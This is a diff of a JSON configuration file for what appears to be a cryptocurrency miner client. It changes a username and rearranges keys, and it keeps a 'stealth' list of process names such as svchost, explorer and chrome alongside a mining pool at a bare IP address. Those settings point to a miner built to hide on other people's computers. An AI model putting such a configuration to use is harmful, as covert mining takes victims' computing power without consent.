@@ -1,18 +1,22 @@
 {
-    "username": "FinanceQrodex",
+    "username": "InsuDex",
     "key": "123",
     "diff": 100,
-    "distress": true,
-    "scripts": "",
-    "altHost": false,
-    "mailBox": "https://venominer-client.bobuxstation.repl.co",
-    "stealth": [
-        "svchost", "explorer", "dwm", "chrome", "system"
-    ],
+    "minerid": "",
     "pools": [
         "http://51.15.127.80"
     ],
+
+    "distress": true,
+    "v4distress": false,
     "blocked": [
         ""
-    ]
+    ],
+    "stealth": [
+        "svchost", "explorer", "dwm", "chrome", "system"
+    ],
+
+    "scripts": "",
+    "altHost": false,
+    "mailBox": "false"
 }
